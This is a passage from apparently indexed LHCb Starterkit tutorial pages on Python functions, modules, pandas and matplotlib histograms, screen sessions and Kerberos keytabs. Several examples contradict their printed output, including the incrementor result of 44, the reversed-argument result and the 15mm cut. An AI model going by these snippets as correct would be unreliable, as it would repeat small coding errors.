If we called make_incrementor(3), then increment has\nthe value 3, and we can fill in the returned method in our heads.\ndef func(var):\n    return var + 3\n\nSo when we call this method, we’ll get back what we put in, but plus 3.\n>>> increment_one = make_incrementator(1)\n>>> increment_two = make_incrementator(1)\n>>> print increment_one(42), increment_two(42)\n43 44\n>>> print make_incrementator(3)(42) # Do it in one go!\n45\n\n\nWhat if you like to accept an arbitrary number of arguments? For example, we\ncan also write a total method that takes two arguments.\n>>> def total(x, y):\n...     \"\"\"Return the sum of the arguments.\"\"\"\n...     return x + y\n...\n>>>\n\nBut what if we want to allow the caller to pass more than two arguments? It\nwould be tedious to define many arguments explicitly.\n>>> def total(*args):\n...     \"\"\"Return the sum of the arguments.\"\"\"\n...     # For seeing what `*` does\n...     print 'Got {0} arguments: {1}'.format(len(args), args)\n...     return sum(args)\n...\n>>> total(1)\nGot 1 arguments: (1,)\n1\n>>> total(1, 2)\nGot 2 arguments: (1, 2)\n3\n>>> total(1, 2, 3)\nGot 3 arguments: (1, 2, 3)\n6\n\nThe *args syntax says “stuff any arguments into a tuple and call it args”.\nThis let’s us capture any number of arguments. As args is a tuple, when could\nloop over it, access a specific element, and so on.\nWe can also expand lists into separate arguments in with the same syntax when\ncalling a method.\n>>> def reverse_args(x, y):\n...     return y, x\n...\n>>> l = [1, 2]\n>>> reverse_args(l)\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: reverse_args() takes exactly 2 arguments (1 given)\n>>> reverse_args(*l)\n('b', 'a')\n\nA similar syntax exists for keyword arguments.\n>>> def ages(**people):\n...     \"\"\"Print people's information.\"\"\"\n...     # For seeing what `**` does\n...     print 'Got {0} arguments: {1}'.format(len(people), people)\n...     for person in people:\n...         print 'Person {0} is {1}'.format(person, people[person])\n...\n>>> ages(steve=31)\nGot 1 arguments: {'steve': 31}\nPerson steve is 31\n>>> ages(steve=31, helen=70, zorblax=9963)\nGot 3 arguments: {'steve': 31, 'zorblax': 9963, 'helen': 70}\nPerson steve is 31\nPerson zorblax is 9963\nPerson helen is 70\n\nAs you can see from the debug print statement, **people is a dictionary\ncontaining the keyword arguments we passed to the ages method. The keys of\nthe dictionary are the names of the argument as strings, and the values are the\nvalues of the arguments. Just like for the * syntax, ** can also be used to\nexpand a dictionary into keyword arguments.\n>>> d = {'thor': 5000, 'yoda': -1}\n>>> ages(**d)\nGot 2 arguments: {'yoda': -1, 'thor': 5000}\nPerson yoda is -1\nPerson thor is 5000\n\nIt’s worth remembering thing because dictionaries are unordered, and the **\nsyntax effectively creates a dictionary, the order of the keyword arguments\nused to call the method are not necessarily the same as those that the function\nblock sees!\n The most generic methodThe most generic method would take any number of positional arguments and any\nnumber of keyword arguments. What would this method look like?\n SolutionClick to expandIt would use both * and ** syntax in defining the arguments.\n>>> def generic(*args, **kwargs):\n...     print 'Got args: {0}'.format(args)\n...     print 'Got kwargs: {0}'.format(kwargs)\n...\n>>> d = {'bing': 'baz'}\n>>> generic(1, 2, 'abc', foo='bar', **d)\nGot args: (1, 2, 'abc')\nGot kwargs: {'bing': 'baz', 'foo': 'bar'}\n\n\nInline methods\nSome methods take other methods as arguments, like the built-in map method.\n>>> map(str, range(5))\n['0', '1', '2', '3', '4']\n\nmap takes a function and a list, and applies the function to each element in\nthe list. It returns a new list with the results. We can define and then pass\nour own functions.\n>>> def cube(x):\n...     \"\"\"Return the third power of x.\"\"\"\n...     return x*x*x\n...\n>>> map(cube, range(5))\n[0, 1, 8, 27, 64]\n\nFor such a simple method, this is a lot of typing! We can use lambda to\ndefine such simple methods inline.\n>>> map(lambda x: x*x*x, range(5))\n[0, 1, 8, 27, 64]\n\nThe syntax of defining a lambda is like this:\nlambda : \n is a command-separate set of variables that the lambda can take as\narguments, and  is the code that is run. A lambda\nautomatically returns whatever the result of the expression is, you don’t need\na return (the return is implicit).\nWriting a lambda statement defines a method, which you can capture as a\nvariable just like any other object.\n>>> div2 = lambda x: x/2\n>>> div2\n at 0x7fc6b2207758>\n>>> map(div2, range(5))\n[0.0, 0.5, 1.0, 1.5, 2.0]\n\n Sum in quadratureWrite a method that accepts an arbitrary number of arguments, and returns the\nsum of the arguments computed in quadrature. A “sum in quadrature” is the\nsquare root of the sum of the squares of each number. You should use lambda\nto define a squaring and a square root function, and map to apply the\nsquaring method.\n SolutionClick to expandWe need a little square root method and a method to square its input.\n>>> square = lambda x: x*x\n>>> sqrt = lambda x: x**0.5\n\nWe then define a method that can accept any number of arguments using the\n*args syntax, and use map to call the square method on the list of\narguments. Then we can call sum on the result, and then sqrt.\n>>> def quadrature(*args):\n...     \"\"\"Return the sum in quadrature of the arguments.\"\"\"\n...     return sqrt(sum(map(square, args)))\n...\n>>> quadrature(1, 1) # should be equal to sqrt(2)\n1.4142135623730951\n>>> 2**0.5\n1.4142135623730951\n\n\nAnother use case for lambda is the built-in filter method (see:\nhelp(filter)).\n>>> filter(lambda x: x % 2 == 0, range(10))\n[0, 2, 4, 6, 8]\n\n List comprehensionHow would you rewrite the filter example above using a list comprehension?\n SolutionClick to expand>>> [ x for x in range(10) if x % 2 == 0 ]\n[0, 2, 4, 6, 8]\n\n\nGenerally, you should only use lambda methods to define little throw-away\nmethods. The main downside with using them is that you can’t attach a docstring\nto them, and they become unwieldy when there’s complex logic.\n"},"python/scripting.html":{"url":"python/scripting.html","title":"Scripting","keywords":"","body":"Scripting\nOK, so we’ve spent quite a long time in Python shells, but we can quit, we can\nonly get back our work line-by-line (with IPython’s history).

We have already met the maths module, but\ndid not talk about how we started using it.\n>>> import math\n>>> math\n\n>>> math.pi\n3.141592653589793\n>>> math.sin(1)\n0.8414709848078965\n\nThe path after from might look different on your computer.\nSo, math is a module, and this seems to behave a lot like other objects we\nhave met: it is a container with properties and methods attached that we can\naccess with the dot operator .. Actually, that is pretty much all there is to\nthem.\nUsing modules into your code: import\nThe keyword import, usually specified at the beginning of your source code, is\nused to tell Python what modules you want to make available to your current\ncode.\nThere are different ways of specifying an import. The one we have seen already\nsimply makes the module available to you:\n>>> import random\n>>> random.uniform(0, 1)\n0.5877109428927353\n\nThe module random contains functions useful for random number generation: with\nthe import above, we have made the random module accessible, and everything\nwithin that module is accessible via the syntax random.. For the record,\nthe uniform(x,y) method returns a pseudo-random number within the range\n[0,1][0,1][0,1].\nSometimes you want to make only one or more things from a given module\naccessible: Python gives you the ability to import just those:\n>>> from random import uniform, choice\n>>> uniform(0, 1)\n0.4059007502204043\n>>> choice([ 33, 56, 42, -1 ])\n42\n\nIn this case the uniform and choice names are available directly, i.e.\nwithout using the random prefix. All other functions in the random module\nare not available in this case. For the record, the choice function returns a\nrandom element from a given collection.\nAnother option is to import all functions of a certain module and make them\navailable without a prefix:\n>>> from random import *\n>>> gauss(0, 1)\n-1.639334770284028\n\nThis is quite not recommended as you generally do not know what is the extent\nof what you are importing and you might end up with name clashes between your\ncurrent code and the imported module.\nLastly, it is possible to import modules, or specific names from a module under\nan alias:\n>>> from random import uniform as uni\n>>> uni(0, 1)\n0.7288973406605329\n>>> import numpy as np\nnp.arccos(1)\n0.0\n\nThis option is useful when you need to assign shorter aliases to names you will\nuse frequently. In particular, the alias np for the numpy module will be\nencountered a lot.\nNote that modules can have submodules, specified with extra dots .:\n>>> from os.path import abspath\n>>> abspath('..')\n'/afs/cern.ch/user/d'\n\nWhen importing a module, its submodules are not available by default and you\nmust import them explicitly:\n>>> import os\n>>> os.getcwd()\n'/afs/cern.ch/user/d/dberzano'\n>>> import os.path\n>>> os.path.basename(os.getcwd())\n'dberzano'\n\nNote that due to the current Python implementation of the os module, os.path\nfunctions are actually available even without importing os.path but just\nos, but you cannot rely on this implementation which represents an exception\nand might change in the future. Always import submodules explicitly!\nIt is also possible to import several modules with a single import command:\n>>> import os, sys, math\n\nbut this is not recommended by the Python style guide, which\nsuggests to use several import statements, one per module, as it improves\nreadability:\n>>> import os\n>>> import sys\n>>> import math\n\nIf you need to import several names from a single modules, you can split an import\nfunction over multiple lines:\n>>> from math import (\n...     exp,\n...     log,\n...     e,\n...     floor\n... )\n>>> floor(exp(log(e)))\n2.0\n\nThe standard library\nThe set of things that Python comes with, from all of the types of objects to\nall of the different modules, is called the standard library. It is\nrecommend to browse through the standard library documentation to see what is\navailable: Python is rich of standard modules, and you should reuse them as much\nas possible instead of rewriting code on your own.\nSome of the categories for which standard modules are available are:\n\nprocessing paths\ndate and time manipulation\nmathematical functions\nparsing of certain file formats\nsupport for multiple processes and threads\n...\n\nUse standard Python library modules with confidence: being part of any standard\nPython distribution, your code will be easily portable.\nModules from PyPi\nMany external modules can be found on PyPi. Some of those modules are\nalready part of some Python distributons (such as Anaconda, which\ncomes with more than a thousand science-oriented modules preinstalled).\nIf a certain module you need is not available on your distribution you can\neasily install it with the pip shell command. Since you do not have write\naccess to a standard Python installation's directories, pip allows you to\ninstall modules only for yourself, under your current user's home directory.\nIt is recommended to set up in your shell startup script (such as ~/.bashrc)\nthe following two lines telling once for all where to install and search for\nPython user modules:\nexport PYTHONUSERBASE=$HOME/.local\nexport PATH=$PYTHONUSERBASE/bin:$PATH\n\nOnce you have done that, close your current terminal window and open a new one,\nand you will be ready to use pip. We will see in a later lesson how to install\nthe root_pandas module with:\npip install --user root_pandas\n\nWrite your first Python module\nThe simplest Python module you can write is just a .py file with some\nfunctions inside:\n# myfirstmodule.py\n\ndef one():\n    print('this is my first function')\n\ndef two():\n    print('this is my second function')\n\nYou can now fire an ipython shell and use those functions right away:\n>>> import myfirstmodule\n>>> myfirstmodule.one()\nthis is my first function\n>>> myfirstmodule.two()\nthis is my second function\n\nBy simply calling the file myfirstmodule.py we have made it available as a\nmodule named myfirstmodule - given that the file is in the same directory\nwhere we have launched the Python interpreter.\n Module names restrictionsNote that you cannot pick any name you want for a module! From the [Python\nstyle guide][pep8-modulenames], we gather that we should use \"short,\nall-lowercase names\". As a matter of fact, if we used dashes in the file name,\nwe would have ended up with a syntax error while trying to load it:\n>>> import my-first-module\n  File \"\", line 1\n    import my-first-module\n             ^\nSyntaxError: invalid syntax\n\nPython treats - as a minus and does not understand your intentions.\n\nWrite a structured module\nLet's now create a more structured module, with submodules and different files.\nWe can start from the myfirstmodule.py file and create a directory structure:\n$ mkdir yabba\n$ cp myfirstmodule.py yabba/__init__.py\n\nWe have reused the same file created before, copied it into a directory called\nyabba and renamed it to __init__.py. The double underscore should ring a\nbell: this is a Python special name, and it represents the \"main file\" within\na module, whereas the directory name now represents the module name.\nThis means that our module is called yabba, and if we import it, functions\nfrom __init__.py will be available:\n>>> import myfirstmodule\n>>> myfirstmodule.one()\nthis is my first function\n>>> myfirstmodule.two()\nthis is my second function\n\nWe can create an additional file inside the yabba directory, say\nyabba/extra.py and have more functions there:\n# yabba/extra.py\n\ndef three():\n  print 'this function will return the number three'\n  return 3\n\nWe have effectively made extra a submodule of yabba. Let's try:\n>>> import yabba\n>>> filter(lambda x: not x.startswith('__'), dir(yabba))\n['one', 'two']\n>>> import yabba.extra\n>>> yabba.extra.three()\nyabba.extra.three()\nthis function will return the number three\n3\n\n What have I done with the filter function?We have used the filter function above to list the functions we have defined\nin our module. Can you describe in detail what the commands above do?\n SolutionClick to expandThe dir(module) command lists all names (not necessarily functions, not\nnecessarily defined by us) contained in a given module. We have used the\nfilter() command to filter out all names starting with two underscores. Every\nitem returned by dir() is passed as x to the lambda function which returns\nTrue or False, determining whether the filter() function should keep or\ndiscard the current element.\n\nRun a module\nWe can make a Python module that can be easily imported by other Python\nprograms, but we can also make it in a way that it can be run directly as a\nPython script.\nLet's write this special module and call it runnable.py:\n#!/usr/bin/env python\n\nlong_format = False\n\ndef print_label(label, msg):\n    if long_format:\n        out = '{0}: {1}'.format(label.upper(), str(msg))\n    else:\n        out = '{0}-{1}'.format(label[0].upper(), str(msg))\n    print out\n\ndef debug(msg):\n    print_label('debug', msg)\n\ndef warning(msg):\n    print_label('warning', msg)\n\nif __name__ == '__main__':\n    print '*** Testing print functions ***'\n    debug('This is a debug message')\n    long_format = True\n    warning('This is a warning message with a long label')\nelse:\n    print 'Module {0} is being imported'.format(__name__)\n\nNow let's make it executable:\n$ chmod +x runnable.py\n\nIt can be now run as a normal executable from your shell:\n$ ./runnable.py\n*** Testing print functions ***\nD-This is a debug message\nWARNING: This is a warning message with a long label\nThere are two outstanding notions here. First off, the first line is a\n\"shebang\": it really has to be the first line in a file (it cannot be the\nsecond, or \"one of the first\", or the first non-empty) and it basically tells\nyour shell that your executable text file has to be interpreted by the current\nPython interpreter. Just use this line as it is.\nSecondly, we notice we have a peculiar if condition with a block that gets\nexecuted when we run the file. __name__ is a special internal Python variable\nwhich is set to the module name in case the module is imported. When the module\nis ran, it is set to the special value \"__main__\".\nThe else: condition we have added is just to show what happens when you import\nthe module instead:\n>>> import runnable\nModule runnable is being imported\n>>> runnable.warning('hey I can use it from here too')\nW-hey I can use it from here too\n\nNow, the if condition is not necessary when you want to run the module - those\nlines in the if block will be executed anyway. It is however used to prevent\nsome lines from being executed when you import the file as a module.\nPlease also note that module imports are typically silent, so the else:\ncondition with a printout would not exist in real life.\n"},"python/learning.html":{"url":"python/learning.html","title":"Learning more","keywords":"","body":"Learning more\nLearning Python is like learning… well, like learning a language! You must \npractice reading and writing regularly, and as you do you’ll become more and \nmore comfortable, starting to get a feeling for how things work, and how to \neffectively express yourself.\nProgramming is a career in and of itself, so as physicists we have twice as \nmuch work to do! It takes people many years to get comfortable with any \nlanguage, so try not to get too frustrated if things seem complicated at the \nbeginning. It gets better!\nWhen you do get stuck, ask friends and colleagues for help. One of the great \nthings about Python is that many people around the world use it, and it’s very \npopular in high energy physics, so you likely already know someone who can help \nsolve your problem. Working on code with others is a great way to learn, as you \ncan see how other people do things, and find out tricks you didn’t know about.\nBeyond other people, Google is a powerful ally. Knowing how to express your \nproblem is important in getting the best answers quickly. Generally, including \na few words as possible is a good idea, like “python dictionary delete \nkey”, or “python read file lines”.\nStack Overflow is an excellent resource, with \ncommunity-provided answers for many programming-related questions. Most \nproblems you encounter will already be answered there, and often the answers \nare quite didactic, providing context and further reading, beyond just posting \nthe code that answers the question (these answers aren’t always the ones marked \nas the ‘best answer’, and don’t always have the most votes).\nExploring Python\nThe Python standard library is a treasure-trove of useful objects and methods. \nWe’ve gone through a tiny subset of them here, some others that might be useful \nto you are:\n\nos: Operating system functions to manipulate and query your machine and the \nfile system, like os.mkdir to make directories and os.rename.\ntempfile: create files and directories in a temporary location, like\n/tmp, e.g. tempfile.mkdtemp.\nglob: File name matching, to be able to do things like ls folder/*.txt in \nPython with glob.glob('folder/*.txt').\nsubprocess: Call shell commands with subprocess.call(['ls', '-l', '-a']).\ntime: Get the current time with time.localtime().tm_hour.\ncollections: Use collections.namedtuple to create your own property-only\nobjects.>>> import collections\n>>> Coordinate = collections.namedtuple('Coordinate', ['x', 'y'])\n>>> coord = Coordinate(4.5, 2.0)\n>>> coord.y\n2.0\n>>> x, y = coord\n>>> x\n4.5\n\nUse collections.OrderedDict for ordered dictionaries.>>> d = {'foo': 'bar', 123: 321, 'hero': 'thor'}\n>>> for key, value in d.items():\n...     print key, value\n...\n123 321\nfoo bar\nhero thor\n>>> d = collections.OrderedDict([('foo', 'bar'), (123, 321)])\n>>> d.update([('hero', 'thor')])\n>>> for key, value in d.items():\n...     print key, value\n...\nfoo bar\n123 321\nhero thor\n\ncollections.defaultdict is useful for creating dictionaries that will create \nautomatically create values when a previously undefined key is accessed.>>> d = collections.defaultdict(int)\n>>> d['foo'] += 1\n>>> print d, d['foo'], d['bar']\ndefaultdict(, {'foo': 1}) 1 0\n\n\n\nConventional coding\n‘Pythonic code’ is code that follows the conventions of the wider Python \ncommunity. Lots of people write Python, and by following certain stylistic \nconventions it makes it easier for everyone to read each other’s code (as they \nsay: ‘you spend 90% of your time reading code, and 10% writing it’).\nPythonic style emphasises clean, readable code, with consistent formatting and \nuseful comments. The most important thing is to be consistent. You can consult \nPEP8, the official Python style recommendations, if you're unsure or to \nwant to settle a dispute like lower_case_functions versus \nupperCaseFunctions. Which of these two methods is easier to read?\nimport time\n\n\ndef myFunc(x,y,verbose = True, fast='yes'):\n    \"\"\"Do the thing.\"\"\"\n    z=( x *y ) /2\n    if verbose == False:\n        print x,y, z\n    if not fast:\n        time.sleep( 1 )\n    return  z* z\n\n\ndef my_func(x, y, verbose=True, fast=True):\n    \"\"\"Return ((x*y)/2)**2.\n\n    Keyword arguments:\n    x, y -- Values used in the computation\n    verbose -- Print computation information\n    fast -- If True, sleep for 1 second before returning\n    \"\"\"\n    z = (x*y)/2\n\n    if verbose:\n        print x, y, z\n    # Should probably remove this functionality\n    if not fast:\n        time.sleep(1)\n\n    return z*z\n\nThe Zen of Python summarises the ‘philosophy’ that the language tries to \nfollow. See what you think!\n>>> import this\n\n\n“There should be one-- and preferably only one --obvious way to do it”\n\nIf there isn't, you might be trying to come at a problem the wrong way.\n"},"python/first_histogram.html":{"url":"python/first_histogram.html","title":"Making your first histogram","keywords":"","body":"Making your first histogram\nIn this section we are going to make our first plots using Python. For this we\nwill use some public LHCb data for B+→H+H+H− B^+ \\rightarrow H^+ H^+ H^- B​+​​→H​+​​H​+​​H​−​​ from the\nCERN open data portal. This data is available\non EOS:\n$ eos root://eospublic.cern.ch/ ls /eos/opendata/lhcb/AntimatterMatters2017/data\nB2HHH_MagnetDown.root\nB2HHH_MagnetUp.root\nPhaseSpaceSimulation.root\n\n Installing python packagesOne of the best things about Python is the huge number of packages available,\nfor everything from art to machine learning to web development. While LCG\nprovides a lot of useful packages there are sometimes things missing.\nFortunately most packages can be easily installed into ~/.local/ using pip\nwith the --user flag. In this lesson we will be using root_pandas which can\nbe installed using:\npip install --user root_pandas\n\nSome packages, such as flake8, provide executables\nwhich are useful to have included on your PATH so they are available without\nspecifying their absolute path. This can be done by running\nexport PATH=$(python -m site --user-base)/bin:$PATH\n\nsee that bash lesson for more details about the PATH variable.\nWe can even upgrade already installed packages using:\npip install --user matplotlib --upgrade\n\nAs LCG uses PYTHONPATH to make packages available any packages it provides\nhave higher priority that the user installed package. In order to make it so\nthe package installed with --user takes precedent you must run\nexport PYTHONPATH=$(python -m site --user-site):$PYTHONPATH\n\nevery time you run the source command above. This is only needed when\ninstalling user packages to upgrade LCG provided ones.\n\nAll ROOT methods made available in Python using a set of automatically generated\nbindings, known as PyROOT. These are all available by using import ROOT. For\nexample if we want to create a TFile using the aforementioned data we can\nlaunch ipython and run:\nIn [1]: import ROOT\nIn [2]: filename = 'root://eospublic.cern.ch//eos/opendata/lhcb/AntimatterMatters2017/data/B2HHH_MagnetDown.root'\nIn [3]: my_file = ROOT.TFile.Open(filename)\nIn [4]: my_file.ls()\n\nTNetXNGFile**       root://eospublic.cern.ch//eos/opendata/lhcb/AntimatterMatters2017/data/B2HHH_MagnetDown.root\n TNetXNGFile*       root://eospublic.cern.ch//eos/opendata/lhcb/AntimatterMatters2017/data/B2HHH_MagnetDown.root\n  KEY: TTree    DecayTree;1 Tree continaing data for B- --> h-h+h- decays\nIn [5]: my_tree = my_file.Get('DecayTree')\nIn [6]: my_tree.Print()\n******************************************************************************\n*Tree    :DecayTree : Tree continaing data for B- --> h-h+h- decays          *\n*Entries :  5135823 : Total =       945201357 bytes  File  Size =  666480138 *\n*        :          : Tree compression factor =   1.42                       *\n******************************************************************************\nWhile it is very useful to be able to access all the ROOT functionality in this\nway, they are often slow and tedious to use. Luckily people have built more\nspecialised bindings to allow ROOT to be used in a more pythonic way.\nPandas\npandas is a library for doing data analysis on\ntabular data, using a data structure known as dataframes. These typically have\ncolumns with labels (like TLeafs in a TTree) with many rows. The\nroot_pandas package we installed earlier can be used to create a pandas\nDataFrame from a root file:\nIn [7]: import root_pandas\nIn [8]: df = root_pandas.read_root(filename, key='DecayTree')\n\nWe can then use df.head(5) to see the first 5 rows of the DataFrame:\nIn [9]: df.head(5)\nOut[9]:\n   B_FlightDistance  B_VertexChi2        H1_PX        H1_PY          H1_PZ  \\\n0         25.301004      1.497280   375.284205   831.308481   51820.233718\n1         94.690700      1.383338 -4985.130785  5853.750057  326157.454706\n2          8.284490      5.187101 -1265.456544  2330.050788   90762.658032\n3          5.590769      7.129099  -720.797259  3413.790588   86793.058768\n4          3.013242     10.988701   397.754571  1791.373059   40040.364159\n\nWhile it is nice to be able to view the data is is typically much more useful to\nbe able to apply operations to it in bulk. In this example we have the momentum\ncomponents for each of the child particles in the decay (H1, H2 and H3)\nbut not the transverse momentum. We can however apply expressions to each row\nof the data like so:\nIn [10]: df.eval('sqrt(H2_PX**2 + H2_PY**2)')\nOut [10]: 0          1306.642724\n1           167.578904\n2          1273.457019\n3          1146.299204\n             ...\n5135820     210.430531\n5135821     762.344570\n5135822    1454.471057\ndtype: float64\n\nThis gives us the transverse momentum for each particle as an array, however, we\ncan also create a new column with this information by assigning to the name we\nwant to create and doing the action \"inplace\":\nIn [11]: df.eval('H2_PT = sqrt(H2_PX**2 + H2_PY**2)', inplace=True)\n\n Adding the total B+ meson momentumCreate a new column in the dataframe called B_P for the total momentum of the\nB+ meson.\n SolutionClick to expanddf.eval('B_P = sqrt('\n        '(H1_PX + H2_PX + H3_PX)**2 + '\n        '(H1_PY + H2_PY + H3_PY)**2 + '\n        '(H1_PZ + H2_PZ + H3_PZ)**2'\n        ')', inplace=True)\n\n\nPlotting histograms\nNow we have the momentum of the B+B+B+ meson it would be useful to plot a\nhistogram. We could use ROOT for this but the most popular Python library for\nplotting is known as matplotlib and this is what we\nwill use here. The most common way matplotlib is used is with the pyplot\ninterface imported as plt like so:\nIn [12]: import matplotlib\nIn [13]: matplotlib.use('Agg')  # Force matplotlib to not use any Xwindows backend.\nIn [14]: from matplotlib import pyplot as plt\nIn [15]: plt.hist(df['B_FlightDistance'])\nIn [16]: plt.savefig('B_flight_distance.pdf')\n\n\n Interactive plottingThere are various ways of viewing plots interactively such as:\n\nplt.show() Opens a window with the current plot and pauses the Python\ninterpreter until the window is closed\nplt.ion() Allows plots to be viewed without pausing the Python interpreter\njupyter A web based interface for running various\nlanguages including python in \"notebooks\". If you've used mathematica or\nmatlab before it's a similar interface with code, documentation and plots\nall shown together.\n\n\nIn [17]: import numpy as np\nIn [18]: bins = np.linspace(0, 150, 100)\nIn [19]: plt.hist(df['B_FlightDistance'], bins=bins)\nIn [20]: plt.savefig('B_flight_distance_v2.pdf')\n\n\nThat's not right! The new histogram has been plotted on top of our first one!\nThis is normally useful as it allows us to layer plots on top of each other to\ncompare them. Though in this case we don't want to that so we should first close\nthe previous plot before making our histogram. We should also add axis labels\nand a legend like so:\nIn [21]: plt.close()  # Close the previous plot\n\nIn [22]: plt.hist(df['B_FlightDistance'], bins=bins, histtype='step', label='My data label')\nIn [23]: plt.xlim(bins[0], bins[-1])\nIn [24]: plt.xlabel('Flight distance of $B^+$ meson')\nIn [25]: plt.legend(loc='best')\nIn [26]: plt.savefig('B_flight_distance_v3.pdf')\n\n\nApplying cuts\nWhen analysing data it is often useful to \"throw away\" some data in order to in\norder change the contributions of a sample. Most commonly this is to remove some\nbackground(s) so we can more precisely study a process of interest. This is\nknown as cutting.\nIn pandas we can apply a cut to a DataFrame using the query method. For\nexample to make a new DataFrame containing B+B^+B​+​​ mesons with flight distances\nof less than 15mm we can use:\nIn [27]: df_with_cut = df.query('B_FlightDistance > 15')\n\n Comparing momentum distributionsIt is often useful to compare the effect of a cut on the distribution of another\nvariable. Try to plot a histogram showing the B+ lifetime distribution with and\nwithout a total B+ momentum cut of 100000 MeV.\n SolutionClick to expandbins = np.linspace(0, 150, 100)\ndf_with_cut = df.query('B_P > 100000')\n\nplt.figure()\nplt.hist(df['B_FlightDistance'], bins=bins, histtype='step', normed=True, label='Without cut')\nplt.hist(df_with_cut['B_FlightDistance'], bins=bins, histtype='step', normed=True, label='With 100 GeV momentum cut')\n\nplt.xlim(bins[0], bins[-1])\nplt.xlabel('Total momentum of $B^+$ meson')\nplt.legend(loc='best')\nplt.savefig('B_flight_distance_with_cut_compare.pdf')\n\nHere we also use the normed=True option with plt.hist, this plots the\nnormalised distribution. This is typically more useful when comparing\ndistributions as it make it easier to see differences in the shape without the\nindependently of the total number of events.\n\n\n Comparing momentum distributionsCalculate and plot the B+ meson mass assuming that all three of the child\nhadrons are kaons.\n\n"},"python/further_reading.html":{"url":"python/further_reading.html","title":"Further reading","keywords":"","body":"More advanced topics in Python\nNice standard libraries\n\nos, sys, re, fnmatch, argsparse, subprocess\n\nNice libraries for data analysis\n\nnumpy, pandas, matplotlib\n\nPython and ROOT\n\npyROOT\nroot_numpy\n\n"},"shell/shell.html":{"url":"shell/shell.html","title":"Shell","keywords":"","body":"UNIX shell\nThe Software Carpentry Foundation has a great lesson on the basics of using the\nUNIX shell that we will be using\nfor the Starterkit course.\nSome additional topics can be found at the more on the UNIX shell webpage, while this section covers LHCb-specific material.\n"},"shell/screen.html":{"url":"shell/screen.html","title":"Using screen to keep things running","keywords":"","body":"Using screen to keep things running\n Learning Objectives\nCreate a new screen session\nDisconnect from a screen session\nReconnect to an existing screen session\nEnd an existing screen session\nHandling of Kerberos tokens\n\n\nOften we want to run a program for a long time on a computer we\nconnected to via ssh, like the lxplus machines. The screen\nprogram allows you to keep programs running on the remote computer\neven if you disconnect from it. For example when putting your laptop\nto sleep or losing wifi.\nConnect to lxplus:\n$ ssh lxplus.cern.ch\n\nYou can start screen by simply typing its name:\n$ screen\n\nOnce you do this it will look as if nothing has happened. However you\nnow have a fresh terminal inside what is refered to as a \"screen\nsession\". Let's type some commands that generate some output:\n$ uptime\n\n 11:48:02 up 15 days, 20:36, 105 users,  load average: 2.26, 2.10, 3.16\n\n$ date\n\nThu Apr 16 11:48:32 CEST 2015\n\nTo disconnect from this session press Ctrl-a d. We are now back to\nthe terminal that we first started in. You can check that your\nscreen session is still running by typing screen -list, which will\nlist all active sessions:\n$ screen -list\n\nThere is a screen on:\n      25593.pts-44.lxplus0234   (Detached)\n1 Socket in /var/run/screen/S-thead.\n\nTo reconnect to the session you use screen -rD. When there is just\none session running (like now) then it will reconnect you to that\nsession. Try it and you should see the date and time output by the\ndate command we ran earlier.\nWhen you have more than one session you need to provide the name of\nthe session as an argument to screen -rD. The name of the above\nsession is: 25593.pts-44.lxplus0234. You can reconnect to it with:\n$ screen -rD 25593.pts-44.lxplus0234\n\nTo end a screen session you are currently connected to, simply press\nCtrl-d. Just like you would to disconnect from a ssh session.\nA screen session is tied to a specific computer. This means you need\nto remember which computer you connected to. Even if your screen\nsession keeps running, you can only resume it from the same machine as\nyou started it.\nWhen connecting to lxplus you are assigned to a random computer, but you can find out its name with hostname:\n$ hostname\n\nlxplus0081.cern.ch\n\nThis tells you that the computer you are connected to is called\nlxplus0081.cern.ch. Later on you can re-connect to exactly this\nmachine with:\n$ ssh lxplus0081.cern.ch\n\nAnother complication are your kerberos tokens. These typically\nexpire as soon as you disconnect from a lxplus machine. This means\nthe program you left running inside the screen session will\nsuddenly not be able to write to any files in your home directory\nanymore. This is particularly annoying if you are running ganga\nin your screen session.\nOne way to stop your tokens from expiring is to type kinit\nwhen you first start a new screen session.

A very useful feature is different sessions in tab pages, all within a single instance of screen.\nIn order to maximise the usefulness of this feature, you need to set the screen status bar. The simplest way to do this is by appending the following line to the file ~/.screenrc (create it if it doesn't already exist):\n# Status lines\nhardstatus off\nhardstatus alwayslastline\nhardstatus string '%{= BG}%{.g}[ %{.G}%H %{.g}][ %{= Bw}%?%-Lw%?%{Yr}%{.k}%n*%f%? %t%?%?(%u)%?%{.r}%{Bw}%?%+Lw%? %{.g}%=][%{.W} %Y-%m-%d %c %{.g}]'\nNote that this has predefined colours and layout that you can easily change yourself, see eg. this detailed discussion.\nThe following commands should help you get started using multiple tabs in a screen window. Note that ^a stands for Ctrl-a in this list.\n\nCreate a new tab: ^a c\nSwitch to tab number #: ^a # (where # is a digit)\nSwitch to the last visited tab: ^a ^a\nClose a tab: log out of the shell with ^d\nKill a tab: ^a k (only use if normal logout through ^d doesn't work because a process has crashed)\nChange a tab's name: ^a A\n\nAs one last note, you may find it easier if the tab numbers start with 1, rather than 0.

After starting it by typing ktutil, type the following three lines into the prompt and confirm the first two steps with your password.\nadd_entry -password -p USERNAME@CERN.CH -k 1 -e arcfour-hmac-md5\nadd_entry -password -p USERNAME@CERN.CH -k 1 -e aes256-cts\nwkt USERNAME.keytab\n\nand close the ktutil prompt with Ctrl+D.\nThis will create a file called USERNAME.keytab in the current directory. It is strongly recommended to store this file in a directory to which only you have access as anyone who obtains a copy of this file can use it to obtain tokens in your name.\nMaking use of the keytab\nThis keytab file can now be used to obtain kerberos tokens without having to type a password:\nkinit -k -t USERNAME.keytab USERNAME@CERN.CH\n\nwhere -k tells kinit to use a keytab file and -t USERNAME.keytab where this keytab actually is.\nUsing k5reauth to automatically refresh your kerberos token\nTo create a permanent session of tmux or screen, the k5reauth command is used, which by default creates a new shell and attaches it as a child to itself and keeps renewing the kerberos token for its children. k5reauth can start processes other than a new shell by specifying the program you want to start as an argument\nk5reauth -f -i 3600 -p .... -- \n\nTo start screen or tmux run:\nk5reauth -f -i 3600 -p USERNAME -k /path/to/USERNAME.keytab -- tmux new-session -s NAME\n\nwhich will create a tmux session whose kerberos token is refreshed automatically every 3600 seconds. When attaching back to the process, a simple\ntmux attach-session -t NAME\n\nor\ntmux a\n\n(if you want to attach the most recently used session) is sufficient.\nYou will almost certainly want to use an alias or function to access this command. One way to do that would be to copy and paste the following into your ~/.bashrc (if you use bash):\nktmux(){\n    if [[ -z \"$1\" ]]; then #if no argument passed\n        k5reauth -f -i 3600 -p USERNAME -k /path/to/USERNAME.keytab -- tmux new-session\n    else #pass the argument as the tmux session name\n        k5reauth -f -i 3600 -p USERNAME -k /path/to/USERNAME.keytab -- tmux new-session -s $1\n    fi\n}\n\nYou could then start a tmux session named 